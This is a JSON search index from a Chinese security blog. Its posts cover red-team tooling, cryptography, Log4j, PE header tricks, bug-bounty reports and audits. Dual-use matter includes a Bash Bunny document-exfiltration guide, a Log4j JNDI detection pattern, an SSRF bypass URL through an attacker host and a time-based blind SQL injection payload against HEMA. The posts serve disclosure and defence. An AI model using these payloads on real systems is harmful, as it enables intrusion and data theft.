防御系统静默拦截会导致\u0026quot;假阴性\u0026quot;风险 红队最佳实践\r避免直接使用公开脚本模板 必须自定义关键流量参数（Host头/Cookie值等） 需验证所有攻击组件在目标环境的有效性 完整技术细节可参考作者培训课程：《企业攻击模拟与C2植入开发》\n","date":"2025-08-02T14:13:50+08:00","permalink":"http://localhost:1313/p/cobalt-strike%E4%B8%8E%E8%B5%9B%E9%97%A8%E9%93%81%E5%85%8B%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E7%BB%95%E8%BF%87%E7%AB%AF%E7%82%B9%E9%98%B2%E6%8A%A4%E7%9A%84%E6%8A%80%E6%9C%AF%E5%89%96%E6%9E%90/","title":"Cobalt Strike与赛门铁克攻防实战：绕过端点防护的技术剖析"},{"content":"使用Bash Bunny获取USB_Exfiltration载荷\r作者：Jordan Drysdale // 红队工具专家\n这是一篇关于我们首次测试并确认在所有启用PowerShell的Windows系统（XP-SP3及以上版本）上100%可靠的实用载荷的快速技术指南。\n关键资源\rBash Bunny Wiki: http://wiki.bashbunny.com/#!index.md 载荷源码: https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/usb_exfiltrator 技术要点\r开关位置与目录结构\n理解极其简单的开关位置配置和目录结构是成功的关键。\n载荷获取与修改\n我们从Bunny的Git仓库下载了全部现有载荷：https://github.com/hak5/bashbunny-payloads\n在将USB_Exfil载荷复制到switch1目录前，我们移除了.PDF引用，这使得我们可以获取用户文档目录下的子目录。\n重要警告\r存储空间限制\n根据目标文档目录的大小，Bash Bunny的存储空间可能被占满（最大约2GB）。 系统状态要求\n测试表明目标系统必须处于解锁状态才能生效。 无论如何，祝您探索愉快！\n","date":"2025-08-02T13:57:49+08:00","permalink":"http://localhost:1313/p/%E4%BD%BF%E7%94%A8bash-bunny%E8%8E%B7%E5%8F%96usb_exfiltration%E8%BD%BD%E8%8D%B7%E7%9A%84%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/","title":"使用Bash Bunny获取USB_Exfiltration载荷的实战指南"},{"content":"密码学专家解答10大关键技术问题\r密码学是电子设备和互联网的基础组成部分，它保护着信用卡、手机、网页浏览（希望您正在使用TLS！）甚至绝密军事数据的安全。在区块链领域，密码学同样至关重要，以太坊等区块链依赖哈希、Merkle树和ECDSA签名等原语来运行。配对密码学、全同态加密和零知识证明等创新技术也已进入区块链领域。\n1. SNARKs最常用的承诺方案有哪些？\r多项式承诺方案是一种协议，证明者承诺某个多项式并生成证明表明该承诺有效。该协议包含三个主要算法：\nCommit Open Verify 在提交阶段，证明者发送其承诺——即他们在给定点对多项式f的评估值（即满足f(x)=a的值a）。该承诺应具有绑定性质，意味着一旦证明者承诺了某个多项式，他们就不能\u0026quot;改变主意\u0026quot;并为另一个多项式生成有效证明。它还可能具有隐藏性质，即在密码学上难以提取满足f(x)=a的值x。\n最常见的生产环境中使用的承诺方案包括：\nKZG(Kate-Zaverucha-Goldberg)，例如用于EIP 4844中的danksharding FRI(快速Reed-Solomon交互式Oracle接近性证明)，用于STARKs 像Pedersen承诺这样的承诺方案，用于Bulletproofs等证明系统(被Monero和Zcash使用) 2. 哈希构造(MD、Sponge)有何区别？\r大多数人所熟悉的哈希函数，如MD5和SHA1，都是Merkle-Damgard构造。而我们熟知且喜爱的keccak256函数则是海绵构造。\n在Merkle-Damgard构造中，任意长度的消息被解析为特定大小的块。关键部分是压缩函数应用于每个块，使用前一个块作为下一个压缩函数的密钥(对于第一个块，我们使用IV或初始化向量代替)。\n相比之下，海绵构造不使用压缩函数。海绵构造的核心包括两个阶段：一个\u0026quot;吸收\u0026quot;阶段，其中消息的部分与初始状态进行异或运算，同时对它应用置换函数；然后是一个\u0026quot;挤压\u0026quot;阶段，其中输出的部分被提取并作为哈希输出。\n3. 椭圆曲线密码学(ECC)的理论攻击有哪些？\rECC通常被视为密码学中复杂且有些神秘的部分，容易受到各种技术攻击。两个值得注意的理论攻击是Weil下降和MOV攻击。\nWeil下降攻击：这种方法涉及使用代数几何中的概念，特别是称为Weil下降的技术。其思想是将离散对数问题从其原始形式的椭圆曲线(复杂的代数结构)转换为更简单的代数结构(如超椭圆曲线)上的类似问题。\nMOV攻击：该攻击使用称为Weil配对的数学函数将椭圆曲线离散对数问题(ECDLP)转换为有限域中的离散对数问题，这是一个不同的数学设置。\n4. 后量子密码系统(如基于格和基于同源的密码学)概述\r基于格的密码学使用格(显然)，它是基向量的整数线性组合。关于格有许多难题，如最短向量问题(给定基，找到格中最短的向量)和最接近向量问题(给定格和格外的点p，找到格中最接近p的点)。\n另一方面，基于同源的密码学涉及使用同源(显然)，这是椭圆曲线之间的同态。我们可以使用这些同源创建标准椭圆曲线Diffie-Hellman密钥交换的后量子版本。\n5. Fiat-Shamir启发式方法有哪些注意事项？\rFiat-Shamir用于将交互式Oracle证明系统转换为非交互式证明系统。这允许证明者证明计算的结果，而不需要验证者在线。这是通过获取公共输入的哈希并将该哈希解释为随机输入来实现的。\n需要注意的几个与安全相关的问题：\n哈希必须包含所有公共输入 即使使用强Fiat-Shamir变换，也可能出现更微妙的理论问题 6. PLONK交互式Oracle证明系统的最新进展\r交互式Oracle证明是SNARKs中的主要信息理论组件，它允许证明者生成证明，以高概率发现伪造证明的方式\u0026quot;说服\u0026quot;验证者的\u0026quot;知识\u0026quot;。\nPLONK证明系统的变体包括：\nTurboplonk：支持两个以上输入的自定义门 UltraPLONK：支持查找表 Hyperplonk：消除了对数论变换(NTT)的需求 7. 构建zkEVM的各种设计决策(Type 1/2/3等)\r不同类型的zkEVM可以根据它们与以太坊的\u0026quot;完全兼容性\u0026quot;来考虑，Type 1最等效，Type 4最不等效。\nType 1 zkEVMs在各方面等同于以太坊的执行和共识层 Type 2 zkEVMs旨在实现EVM等效 Type 3 zkEVMs通过使用更少的等效性实现更快的证明时间 Type 4 zkEVMs旨在将Solidity和Vyper等语言编译为ZK友好格式以生成证明 8. zkEVMs的进一步改进\r虽然从理论上讲，构建zkEVM和创建高效证明的主要挑战可以通过plonkish算术化、查找和增量可验证组合(IVC)的组合来解决，但在我们真正实现ZK证明所承诺的大规模可扩展性之前，仍存在许多工程挑战。\n可能的进一步优化包括：\n使用更小的字段 硬件改进和并行化 理论改进 9. Shamir的秘密共享方案及其常见错误\rShamir的秘密共享(SSS)是一种在各方之间分割一组秘密的方法，使得一组参与者可以合作恢复秘密，但任何数量少于阈值的参与者都无法了解任何信息。\n需要注意的几个可能使SSS或Feldman的可验证秘密共享完全不安全的\u0026quot;陷阱\u0026quot;：\n向参与者共享0点会无意中泄露秘密 确保共享之间的差异不为0或模等价 10. 递归证明的折叠方案如何工作？\r折叠方案是增量可验证计算问题的一种解决方案。折叠方案起源于Nova，并引入了一个新想法：验证者不会在每次调用F时验证SNARK，而是将当前实例\u0026quot;折叠\u0026quot;到累加器中。\n对折叠方案的几项更新和改进已经完成。例如，Sangria方案将折叠推广到Plonkish算术化，而不仅仅是R1CS。HyperNova将Nova推广到可定制约束系统(CCS)，这是一个更通用的约束系统，可以表达Plonkish和AIR算术化。\n迈向更好的密码学安全\r密码学不断发展，理论与实现之间的差距越来越小。更多有趣的密码学协议和新颖的实现正在各处涌现，包括多方计算、增量可验证组合、全同态加密以及介于两者之间的一切。\n","date":"2025-08-02T13:46:58+08:00","permalink":"http://localhost:1313/p/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%93%E5%AE%B6%E8%A7%A3%E7%AD%9410%E5%A4%A7%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF%E9%97%AE%E9%A2%98-%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90%E5%AF%86%E7%A0%81%E5%AD%A6%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/","title":"密码学专家解答10大关键技术问题 - 深入解析密码学原理与应用"},{"content":"Windows XP に対するサイバー脅威、および中小企業と個人消費者へのガイダンス\r2014年4月8日，微软正式终止对Windows XP的产品支持。本文基于微软安全情报报告数据，揭示终止支持后Windows XP系统将面临的五大威胁：\n风险1：网络浏览\r威胁：攻击者会将新发现的XP漏洞集成到犯罪工具包中，通过恶意网站传播恶意软件。 建议：限制XP系统访问的网站范围或完全断开互联网连接。 注意：更换浏览器无法缓解此类攻击。 风险2：电子邮件与即时通讯\r威胁：钓鱼邮件和恶意附件将针对XP的新漏洞进行攻击。 建议：避免使用XP系统处理邮件/IM，不点击可疑链接或附件。 注意：更换邮件客户端软件无效。 风险3：可移动设备\r威胁：USB设备可能成为恶意软件传播载体。 建议：禁用USB端口或物理封堵接口，参考微软《防御自动运行攻击》指南。 风险4：蠕虫病毒\r威胁：类似Conficker的蠕虫会利用新漏洞在企业网络传播。 建议：审查防火墙规则，禁用可移动设备，使用强密码策略。 风险5：勒索软件\r威胁：攻击者利用未修复漏洞部署勒索软件加密用户文件。 建议：定期备份关键数据至隔离存储设备。 升级建议\r微软强烈建议迁移至Windows 7/8系统，新系统包含十年来的安全改进：\n新硬件优先：推荐搭配触控设备的Windows 8+系统 升级路径： XP需全新安装（用户数据可迁移） 通过AmIRunningXP.com检测系统版本 系统要求：需满足Windows 8.1的最低硬件配置 本文数据来源于微软安全情报报告，涵盖全球数亿系统的威胁统计数据。终止支持后，XP系统将无法获得安全更新，风险随时间递增。\n","date":"2025-08-02T13:30:21+08:00","permalink":"http://localhost:1313/p/windows-xp%E9%9D%A2%E4%B8%B4%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%E5%8F%8A%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E4%B8%8E%E4%B8%AA%E4%BA%BA%E7%94%A8%E6%88%B7%E5%BA%94%E5%AF%B9%E6%8C%87%E5%8D%97/","title":"Windows XP面临的网络安全威胁及中小企业与个人用户应对指南"},{"content":"紧急更新：修复Apache Log4j严重漏洞\r新闻稿 | 2021年12月11日 | 20:02\n荷兰国家网络安全中心(NCSC)发现Apache Log4j（Web应用程序广泛使用的日志组件）存在严重漏洞。攻击者可远程利用该漏洞（被命名为\u0026quot;Log4Shell\u0026quot;）劫持服务器权限，NCSC已发布高危/高危安全警报。\n关键行动建议\r立即安装Apache官方补丁 使用Northwave检测工具扫描服务器 检查GitHub受影响应用清单，该清单将持续更新 技术细节\r漏洞机理：通过JNDI注入实现远程代码执行 影响范围：全球大中小型组织使用的各类系统 当前态势：荷兰境内已出现扫描活动，预计短期内会出现更多攻击变种 日志检测方案\r检查日志中是否存在以下特征：\n${jndi:ldap://}等异常日志条目 非常规网络连接请求 免责声明：第三方检测工具需谨慎评估，NCSC不担保其准确性\n该漏洞利用方式已公开，随着关注度上升，预计将出现更多攻击手法。修复时效性至关重要，建议立即联系软件供应商确认系统是否受影响。\nNCSC正持续监控威胁态势，请关注官网获取最新信息\n","date":"2025-08-02T13:09:02+08:00","permalink":"http://localhost:1313/p/%E7%B4%A7%E6%80%A5%E6%9B%B4%E6%96%B0apache-log4j%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%8C%87%E5%8D%97/","title":"紧急更新：Apache Log4j严重漏洞修复指南"},{"content":"我们的静态分析工具Circomspect现已正式集成至Sindri命令行界面（CLI）！Circomspect专为帮助开发者更安全地构建Circom电路而设计，特别是在该新型编程框架工具支持有限的情况下。此次集成标志着Circomspect向更广泛使用迈出重要一步，从而为编写Circom电路的开发者提供更好支持。\n开发零知识证明电路是项艰巨任务。即使忽略技术复杂性，在Circom等平台上运行非基础电路也需要极高的计算资源：基础测试可能耗时数分钟（或更久），这将大幅延长开发周期。Sindri通过让用户访问能显著加速电路执行的专用硬件来缓解该问题。其简洁的API和CLI工具使开发者无需自行管理基础设施即可将电路与专用硬件集成。\nSindri Labs首席执行官Stasia Carson对此表示：\n\u0026ldquo;我们持续聚焦于让Sindri CLI对电路开发者更具普适价值，无论其是否使用Sindri服务。关键在于通过优化Docker容器实现无安装工具分发，并为静态分析、代码检查、编译和验证等工具提供统一的跨框架接口。Circomspect是开发安全Circom电路的关键工具，坦白说它可能是所有框架中最佳的安全工具，因此我们视其为最重要的集成之一。\u0026rdquo;\n此次集成对Circomspect具有里程碑意义。随着用户群体扩大，我们计划扩展更多分析功能，相关进展将在年内陆续公布。请持续关注我们的博客，获取关于Circomspect和零知识证明电路开发的最新动态！\n","date":"2025-08-02T12:58:09+08:00","permalink":"http://localhost:1313/p/circomspect%E5%B7%A5%E5%85%B7%E6%AD%A3%E5%BC%8F%E9%9B%86%E6%88%90%E8%87%B3sindri-cli%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E%E7%94%B5%E8%B7%AF%E5%BC%80%E5%8F%91%E8%BF%8E%E6%9D%A5%E5%AE%89%E5%85%A8%E5%A2%9E%E5%BC%BA/","title":"Circomspect工具正式集成至Sindri CLI——零知识证明电路开发迎来安全增强"},{"content":"博士论文：语言解释器中堆溢出漏洞的灰盒自动利用生成\r核心创新\r模块化利用链架构\n将传统单阶段利用生成拆分为堆布局控制、原语构建、ASLR绕过等可组合阶段 采用类似模糊测试的灰盒方法解决各阶段子问题 模板驱动开发\n设计人类可读的模板语言连接各阶段解决方案 支持\u0026quot;人在环路\u0026quot;开发模式，允许人工介入关键环节 惰性求解机制\n通过假设验证模式（先模拟后求解）大幅降低计算开销 例如：先假设特定堆布局可被利用，验证成功后再实际构造该布局 技术突破\r全球首个针对PHP/Python解释器堆溢出的自动利用系统 纯灰盒方案在堆布局操控任务上比符号执行快3个数量级 实现包含信息泄露、堆风水、控制流劫持的完整利用链 应用价值\r发现真实解释器漏洞中89%的堆溢出可自动化利用 模板系统可扩展支持新漏洞类型（如UAF漏洞） 为浏览器/内核等复杂目标的利用生成提供方法论基础 延伸阅读\r《Gollum: 解释器堆溢出的模块化灰盒利用生成》（CCS 2019） 《自动化堆布局操控技术》（USENIX Security 2018） \u0026ldquo;未来利用生成系统将是模糊测试技术与模板化组件的有机结合，符号执行仅用于关键精度要求场景。\u0026rdquo; —— 论文核心观点\n","date":"2025-08-02T12:47:21+08:00","permalink":"http://localhost:1313/p/%E7%81%B0%E7%9B%92%E8%87%AA%E5%8A%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%94%9F%E6%88%90%E8%AF%AD%E8%A8%80%E8%A7%A3%E9%87%8A%E5%99%A8%E5%A0%86%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%A0%94%E7%A9%B6/","title":"灰盒自动漏洞利用生成：语言解释器堆溢出攻击研究"},{"content":"滥用未公开特性伪造PE节区头部\r引言\r在调试其他项目时，我偶然发现PE文件的特殊行为：当NT头中的SectionAlignment值小于页面大小(4096)时，镜像的内存映射方式会出现显著差异。加载器不会按常规方式解析节区表构造内存镜像，而是将整个文件（包括头部）以RWX权限映射到内存中 - 完全忽略单独的节区头部。\n这种特性使得我们可以创建不含任何节区但仍能执行自身代码的PE可执行文件。由于默认具有写权限，这些代码甚至可以实现自我修改。\nWindows内核机制\r在MiCreateImageFileMap函数中可见PE头解析逻辑：当SectionAlignment小于0x1000时，系统会在映射镜像前设置未公开标志位(0x200000)：\n1 2 3 4 5 6 7 8 9 10 11 if(v29-\u0026gt;SectionAlignment \u0026lt; 0x1000) { if((SectionFlags \u0026amp; 0x80000) != 0) { v17 = 0xC000007B; MiLogCreateImageFileMapFailure(v36, v39, *(unsigned int *)(v29 + 64), DWORD1(v99)); ImageFailureReason = 55; goto LABEL_81; } SectionFlags |= 0x200000; } 当该标志置位时，MiBuildImageControlArea将整个文件视为单个节区：\n1 2 3 4 if((SectionFlags \u0026amp; 0x200000) != 0) { SectionCount = 1; } 技术验证\r示例1：无节区可执行PE\r通过手工构造的PE头部演示该技术（关键字段）：\n1 2 3 4 5 6 7 8 (DOS Header) e_magic: 0x5A4D e_lfanew: 0x40 (NT Header) SectionAlignment: 0x200 // 关键值 SizeOfImage: 0x100000 NumberOfSections: 0x0 // 无节区 Characteristics: 0x22 附加的位置无关代码通过动态加载user32.dll调用MessageBoxA，该payload同时兼容32/64位环境：\n1 2 3 4 5 6 mov eax, esp ; 架构检测机制 push 0 sub eax, esp pop ecx cmp eax, 8 je 64bit_code 示例2：带伪造节区的可执行PE\r更有趣的是可以创建虚假的只读节区。虽然节区标记为只读，但实际内存仍具有RWX权限：\n1 2 3 (伪造的节区头部) VirtualSize: 0x1000 Characteristics: 0x40000040 // 只读标志 技术细节\r有效载荷可以嵌入NT头部内部（SizeOfHeaders值可设为0） 从Vista到Win10所有版本均受影响 现代反汇编工具已能识别此类文件 可能最初设计用于超小镜像（整镜像小于内存页） 示例EXE文件下载\n特别说明：该技术通过比较栈指针变化检测运行架构，虽非最优但足够用于概念验证。实际攻击中可采用更精细的检测方法。\n","date":"2025-08-02T12:36:32+08:00","permalink":"http://localhost:1313/p/%E5%88%A9%E7%94%A8%E6%9C%AA%E5%85%AC%E5%BC%80%E7%89%B9%E6%80%A7%E4%BC%AA%E9%80%A0pe%E8%8A%82%E5%8C%BA%E5%A4%B4%E9%83%A8%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","title":"利用未公开特性伪造PE节区头部的技术分析"},{"content":"谷歌工程师提出方案缓解原型污染\rJohn Leyden\n2023年2月6日 15:57 UTC\n更新于2023年2月6日 17:02 UTC\n谷歌的软件工程师提出了一项提案，旨在遏制已成为Web安全公害的原型污染漏洞。原型污染是JavaScript语言缺陷，允许攻击者在运行时操纵他们无法控制或访问的对象。该问题源于对象（用于在运行时保存数据）与其原型（决定对象行为方式）之间缺乏明确界限。\n这项获得谷歌支持的提案已提交给技术工作组TC39审议，旨在创建JavaScript对象与原型之间的边界。其技术原理是\u0026quot;消除允许攻击者从对象跳转到原型的路径\u0026quot;。提案技术细节已发布在GitHub上。\n可选安全模式\r正如GitHub帖子所述，该\u0026quot;提案试图通过引入可选安全模式来缓解原型污染，该模式使得无法使用字符串属性键访问原型，而要求必须通过方法（Object.getPrototypeOf）或提议的新符号属性键来访问\u0026quot;。\n提案合著者Santiago Diaz表示：\u0026ldquo;目标是打破已知的利用技术，同时尽可能与现有代码库兼容，以便这种缓解措施能在互联网上广泛采用。\u0026ldquo;TC39工作组已批准提案从阶段0进入阶段1，开始了五部分批准流程的下一阶段。\n符号解决方案\rPortSwigger安全研究员Gareth Hayes对此提案表示兴趣：\u0026ldquo;这是通过让开发者能够移除__proto__等属性来防止原型污染的提案。他们建议使用符号使网站继续使用__proto__功能，这样网站不会崩溃，攻击者也无法提供这些符号，因为这需要JavaScript执行。\u0026rdquo;\n谷歌提案并非首创。但根据谷歌博客文章，现有解决方案如Object.freeze、preventExtensions和seal存在\u0026quot;使其难以部署的缺点\u0026rdquo;。该提案有望提供更实用的解决方案。\n","date":"2025-08-02T12:20:23+08:00","permalink":"http://localhost:1313/p/%E8%B0%B7%E6%AD%8C%E5%B7%A5%E7%A8%8B%E5%B8%88%E6%8F%90%E5%87%BA%E6%96%B9%E6%A1%88%E7%BC%93%E8%A7%A3javascript%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E/","title":"谷歌工程师提出方案缓解JavaScript原型污染漏洞"},{"content":"HEMA网站盲SQL注入漏洞分析\r技术背景\r现代网站普遍采用数据库存储数据，服务器应用通过SQL查询语句与数据库交互。当存在查询构造缺陷时，攻击者可能通过注入恶意SQL代码获取敏感数据，这类漏洞被称为SQL注入(SQLi)，在漏洞赏金计划中通常属于高危漏洞。\n漏洞发现过程\r在HEMA照片项目服务子域fasteditor.hema.com发现可疑API端点：\n1 https://fasteditor.hema.com/api/user/\u0026lt;userID\u0026gt;/products?offset=0\u0026amp;limit=8\u0026amp;orderby=id+DESC 测试发现orderby参数存在SQL注入特征：\n插入单引号导致返回PDO错误 错误信息显示原始SQL片段且未转义 漏洞利用技术\rSQLMap工具检测确认存在三种攻击方式：\n布尔盲注：通过结果排序差异推断数据 堆叠查询：追加执行额外SQL语句 时间盲注：利用SLEEP()函数时序分析 手工Payload构造\r由于防火墙限制，最终采用时间盲注技术构造特殊payload：\n1 orderby=width+DESC;SELECT+(CASE+WHEN+(SUBSTRING((user())FROM(1)FOR(1))=\u0026#39;§h§\u0026#39;)+THEN+SLEEP(8)+ELSE+SLEEP(1)+END) 关键技术点：\n使用FROM/FOR替代被过滤的逗号 通过Burp Intruder自动化字符爆破 响应时间差异判断字符命中 漏洞验证结果\r成功获取数据库用户信息：\n1 hema_live@10.0.102.192 证明该端点存在可被利用的SQL注入漏洞。\n修复建议\r使用参数化查询替代字符串拼接 实施严格的输入验证 建立SQL查询日志审计机制 时间线\r2020-05-11：漏洞发现并修复 2020-05-15：HEMA确认漏洞并发放奖励 2020-08-06：报告公开披露 ","date":"2025-08-02T12:04:20+08:00","permalink":"http://localhost:1313/p/hema%E7%BD%91%E7%AB%99%E7%9B%B2%E6%B3%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","title":"HEMA网站盲注SQL注入漏洞技术分析"},{"content":"Ruby生态系统中央包仓库安全审计\rRuby Central委托Trail of Bits对Ruby应用官方包管理系统RubyGems.org进行安全评估和竞品分析。作为下载量超1840亿次的关键基础设施，该平台的安全直接影响数百万Ruby开发者。\n审计范围与发现\r三名工程师耗时五周审查了rubygems.org和rubygems-terraform代码库，重点评估：\n常见Web漏洞（XSS/CSRF/SQLi/SSRF） 认证绕过风险 权限控制有效性 AWS服务配置安全 发现的33个安全问题中包括：\n高危漏洞：SMTP邮件系统采用enable_starttls_auto: true配置，可能被中间人攻击降级为明文传输。建议改用强制TLS的enable_starttls配置。 部署流程缺陷：生产环境部署缺乏多方审批机制 基础设施风险：混合使用IaC与手动配置导致安全缺口（TOB-RGM-16等4个相关发现） 反序列化风险：RubyGems库存储Marshal数据可能被利用（虽不影响服务本身） 竞品分析与改进建议\r对比PyPI/npm等包管理器后提出19项改进，重点包括：\n强化可信发布基础设施 扩展支持平台范围 自动化权限管理（Terraform） 集成安全测试工具链（Semgrep/Burp Suite/Ruzzy） 自动化测试方案\r采用多层次安全测试：\n静态分析：定制Semgrep规则检测不安全配置 动态测试：Burp Suite Professional检测SSRF/API漏洞 模糊测试：Ruzzy模糊测试器重点检测WebAuthn的CBOR库内存损坏风险 \u0026ldquo;此次审计既确认了我们负责任地维护着Ruby包生态，也指明了下一步安全投资方向\u0026rdquo; —— Ruby Central安全工程师Samuel Giddins\n完整报告详见[审计报告链接]，Ruby Central团队声明参见[公告链接]。\n","date":"2025-08-02T11:53:14+08:00","permalink":"http://localhost:1313/p/rubygems.org%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A33%E4%B8%AA%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%8A%A0%E5%9B%BA%E5%BB%BA%E8%AE%AE/","title":"RubyGems.org安全审计报告：33个漏洞与加固建议"},{"content":"新的基金会架构\r6月18日QueryCon前夕，Linux基金会正式宣布从Facebook接管osquery所有权。新成立的osquery基金会将由技术指导委员会（TSC）管理，成员来自Facebook、Trail of Bits、Google和Kolide等公司的工程师。该变革解决了项目规模超出Facebook单独维护能力的问题。\n基金会运作机制\rLinux基金会提供资金和管理平台支持 TSC在社区贡献支持下主导项目方向 Trail of Bits承诺每两周举行公开办公时间 Facebook移交基础设施控制权但保留维护席位 CommunityBridge平台即将开放项目赞助通道 关键技术决策\r版本合并：将osql社区分支功能合并回主代码库 发布周期：采用月度交替发布开发版/稳定版机制 构建系统： 恢复CMake支持（#5604/#5610） 重构Linux第三方库源码构建（#5706） 安全增强： 改进Windows证书存储查询（#5696/#5697） 引入模糊测试和地址消毒检测（#5665） 计划集成静态/动态分析到CI系统 PR提交爆发增长\rQueryCon后12周内合并89个PR（社区贡献占比超70%），而此前9个月仅合并35个。Trail of Bits贡献了44个关键PR，包括：\n构建依赖项源码编译支持 Windows证书全用户扫描能力 新的高性能事件框架 稳定版重大更新\r构建系统： 同时支持Facebook的Buck和社区标准CMake 实现Linux自定义工具链 新特性： Linux进程事件扩展检测 正则表达式查询支持 Linux eBPF事件追踪初步支持 macOS T1/T2芯片检测表 性能优化： 资源泄漏修复 表格性能分析工具增强 会议成果延续\rQueryCon 2019作为催化剂，推动了osquery从企业项目向社区驱动模式的转型。技术债务清理、跨平台构建统一和安全监控能力提升，标志着该项目进入新的发展阶段。\n","date":"2025-08-02T11:42:18+08:00","permalink":"http://localhost:1313/p/querycon-2019osquery%E5%8F%91%E5%B1%95%E7%9A%84%E8%BD%AC%E6%8A%98%E7%82%B9-%E6%8A%80%E6%9C%AF%E9%9D%A9%E6%96%B0%E4%B8%8E%E7%A4%BE%E5%8C%BA%E6%B2%BB%E7%90%86/","title":"QueryCon 2019：osquery发展的转折点 - 技术革新与社区治理"},{"content":"Maat：让符号执行变得简单\r我们发布了Maat——一个跨架构、多用途且用户友好的符号执行框架。它提供动态符号执行（DSE）、污点分析、二进制插桩、环境模拟和约束求解等核心功能。基于Ghidra的中间表示语言p-code，Maat兼具C++高性能API和Python便捷接口，既适合安全专家也方便初学者入门。\n用户友好的灵活API\r提供C++底层API和Python绑定 调试器式交互：支持启动/暂停/回滚执行过程 支持通过回调函数插桩目标代码（寄存器/内存访问等事件触发） 可定制符号数据处理策略（符号指针处理、状态约束保存等） 丰富的架构支持\r基于Ghidra的sleigh库实现跨架构支持 当前已验证X86/X64架构 未来计划支持Java/Dalvik/Ethereum等虚拟机字节码 无需安装Ghidra即可使用独立版sleigh 性能优化设计\r纯C++核心实现 实测性能：主流笔记本每秒执行10-30万条指令（2.3GHz i7/32GB RAM） 未来将添加运行时瓶颈诊断功能 快速开始\r安装：python3 -m pip install pymaat 查看教程系列 访问GitHub仓库获取源码和API文档 通过GitHub讨论区提交反馈 ","date":"2025-08-02T11:26:19+08:00","permalink":"http://localhost:1313/p/maat%E8%AE%A9%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%8F%98%E5%BE%97%E7%AE%80%E5%8D%95-%E8%B7%A8%E6%9E%B6%E6%9E%84%E5%A4%9A%E5%8A%9F%E8%83%BD%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E6%A1%86%E6%9E%B6/","title":"Maat：让符号执行变得简单 - 跨架构多功能符号执行框架"},{"content":"谷歌向黑客二人组支付2.2万美元漏洞赏金，涉及多个云项目安全漏洞\r谷歌云平台(GCP)四个项目中的安全漏洞使两名安全研究人员获得了超过22,000美元的漏洞赏金。黑客二人组Sreeram KL和Sivanesh Ashok收益最丰厚的项目是机器学习训练和部署平台Vertex AI，他们因发现服务器端请求伪造(SSRF)漏洞及后续补丁绕过获得了两个5,000美元的奖励。\n根据Sreeram的博客文章，该漏洞存在于Vertex AI的Workbench功能中，该功能支持在云上创建基于Jupyter Notebook的开发环境。通过利用SSRF漏洞并诱骗受害者点击恶意URL，攻击者可能夺取授权令牌的控制权，进而控制受害者的所有GCP项目。\nSSRF漏洞技术细节\r研究人员发现某个URL存在SSRF可能时，\u0026ldquo;请求原始URL返回的响应看起来像是发送到compute.googleapis.com的认证请求输出\u0026rdquo;，Sreeram表示。通过模糊测试，他们发现https://{INSTANCE-ID}-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/{attacker.com}/compute.googleapis.com/可绕过检查，且该易受攻击的端点是没有CSRF保护的GET请求。\n谷歌通过为GET端点添加CSRF保护并改进域名验证修复了该问题。\n补丁绕过技术\r修复后，研究人员发现将compute.googleapis.com改为something.google.com不再触发错误。他们利用Google的FeedBurner服务实现开放重定向，最终结合2020年@s1r1us针对Jupyter Lab开发的CSRF绕过技术完成了漏洞利用。\n其他云项目漏洞\rTheia IDE：利用XSS漏洞(CVE-2021-41038)获取元数据服务器中的服务账户令牌，获得3,133.70美元赏金 Compute Engine：SSH-in-browser功能中的密钥注入问题可能导致远程代码执行，获得5,000美元奖励及1,000美元额外奖金 Cloud Workstations：授权绕过漏洞获得3,133.70美元赏金 二人总计通过六个漏洞赏金项目获得22,267美元。文章还包含多个漏洞的概念验证视频和技术细节说明。\n","date":"2025-08-02T11:15:24+08:00","permalink":"http://localhost:1313/p/%E8%B0%B7%E6%AD%8C%E5%90%91%E9%BB%91%E5%AE%A2%E4%BA%8C%E4%BA%BA%E7%BB%84%E6%94%AF%E4%BB%982.2%E4%B8%87%E7%BE%8E%E5%85%83%E6%BC%8F%E6%B4%9E%E8%B5%8F%E9%87%91%E6%B6%89%E5%8F%8A%E5%A4%9A%E4%B8%AA%E4%BA%91%E9%A1%B9%E7%9B%AE%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/","title":"谷歌向黑客二人组支付2.2万美元漏洞赏金，涉及多个云项目安全漏洞"},{"content":"引言\rInternet Explorer（IE）和Edge通过多项安全防护技术显著提升了用户安全性。这些缓解措施不仅使某些漏洞类型无法被利用，还大幅提高了攻击者开发有效漏洞利用的成本。由于这些变化，分析崩溃的可利用性变得更为复杂，必须综合考虑缓解措施的影响。本文旨在为安全社区提供技术指导，帮助判断漏洞是否真正可被利用。\nUse-After-Free漏洞缓解技术\rUse-After-Free（UAF）是现代面向对象软件中的常见漏洞类型，通常由对象释放后仍被引用导致。微软开发了两项主要防护技术：\nMemory Protector（MP）\n针对栈或寄存器中保存的悬垂指针，通过延迟释放和扫描机制防止内存被恶意重用。 支持\u0026quot;Stress Mode\u0026quot;（通过注册表启用），可立即触发释放以简化分析。 MemGC\n当前仅用于Edge和IE11，扩展了MP的功能，额外扫描堆引用，确保对象仅在无任何引用时释放。 可利用性与服务策略\rMemGC防护的UAF漏洞：除非出现罕见的零写入导致可利用状态，否则视为已完全缓解，不发布安全更新。 